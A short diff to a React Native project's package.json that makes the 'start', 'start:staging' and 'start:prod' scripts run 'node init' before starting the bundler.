@@ -9,10 +9,10 @@
     "android:prod": "ENVFILE=.env.production react-native run-android",
     "ios:staging": "ENVFILE=.env.staging react-native run-ios",
     "ios:prod": "ENVFILE=.env.production react-native run-ios",
-    "start:staging": "ENVFILE=.env.staging react-native start",
-    "start:prod": "ENVFILE=.env.production react-native start",
+    "start:staging": "node init && ENVFILE=.env.staging react-native start",
+    "start:prod": "node init && ENVFILE=.env.production react-native start",
     "lint": "eslint .",
-    "start": "react-native start",
+    "start": "node init && react-native start",
     "test": "jest"
   },
   "dependencies": {
